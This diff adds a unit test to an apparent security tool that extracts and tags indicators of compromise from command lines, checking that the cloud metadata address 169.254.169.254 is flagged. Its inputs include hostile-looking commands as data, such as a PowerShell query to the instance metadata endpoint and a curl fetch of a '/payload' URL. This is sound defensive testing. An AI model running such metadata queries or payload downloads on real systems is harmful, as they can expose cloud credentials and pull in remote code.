@@ -86,6 +86,37 @@ class TestContextualIocExtractorAndDefanging(unittest.TestCase):
         data_raw = json.loads(buf_raw.getvalue())
         self.assertEqual(data_raw["iocs"][0]["value"], "http://evil.example:8080/a.ps1")
 
+    def test_tag_cloud_metadata_endpoints(self) -> None:
+        cmd_meta = "Invoke-RestMethod -Method GET -Headers @{} http://169.254.169.254/opc/v1/instance"
+        verdict_meta = unmask_command(cmd_meta)
+        meta_iocs = verdict_meta.iocs
+        self.assertTrue(len(meta_iocs) >= 2)
+        url_ioc = next(i for i in meta_iocs if i.ioc_type == "url")
+        ip_ioc = next(i for i in meta_iocs if i.ioc_type == "ipv4")
+        self.assertTrue(url_ioc.is_cloud_metadata)
+        self.assertTrue(ip_ioc.is_cloud_metadata)
+
+        # Bare IP 169.254.169.254
+        v_bare = unmask_command("ping 169.254.169.254")
+        bare_ioc = next(i for i in v_bare.iocs if i.ioc_type == "ipv4")
+        self.assertTrue(bare_ioc.is_cloud_metadata)
+
+        # Other link-local (non-metadata) 169.254.1.1 must NOT be tagged as cloud metadata
+        v_ll = unmask_command("ping 169.254.1.1; curl http://169.254.1.1/test")
+        for i in v_ll.iocs:
+            self.assertFalse(i.is_cloud_metadata, f"Non-metadata IP/URL was unexpectedly tagged: {i}")
+
+        # Regular external IP / domain
+        v_ext = unmask_command("curl http://198.51.100.42/payload")
+        for i in v_ext.iocs:
+            self.assertFalse(i.is_cloud_metadata)
+
+        # JSON serialization includes is_cloud_metadata
+        v_dict = verdict_meta.to_dict()
+        for i_dict in v_dict["iocs"]:
+            self.assertIn("is_cloud_metadata", i_dict)
+            self.assertTrue(i_dict["is_cloud_metadata"])
+
 
 if __name__ == "__main__":
     unittest.main()
